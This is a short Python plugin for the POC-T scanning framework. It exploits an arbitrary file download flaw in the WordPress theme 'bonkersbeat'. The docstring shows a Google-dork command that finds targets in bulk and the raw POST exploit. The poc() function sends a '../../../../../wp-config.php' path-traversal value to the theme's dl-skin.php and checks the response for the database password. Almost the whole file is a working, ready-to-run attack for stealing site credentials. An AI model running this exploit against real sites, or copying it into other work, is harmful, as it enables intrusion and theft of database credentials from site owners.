#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
WordPress theme bonkersbeat Arbitrary File Download Vulnerability

Usage
  python POC-T.py -s wp-bonkersbeat-filedownload -aG "inurl:/wp-content/themes/bonkersbeat"

EXPLOIT
  [POST] http://host/wp-content/themes/bonkersbeat/lib/scripts/dl-skin.php
  _mysite_download_skin=../../../../../wp-config.php

"""

import urllib2
from plugin.urlparser import get_domain


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    payload = '/wp-content/themes/bonkersbeat/lib/scripts/dl-skin.php'
    target = get_domain(url).rstrip('/') + payload
    try:
        r = urllib2.urlopen(target, data="_mysite_download_skin=../../../../../wp-config.php", timeout=5).read()
        if "define('DB_PASSWORD'" in r and '@package WordPress' in r:
            return target
    except Exception:
        pass
    return False
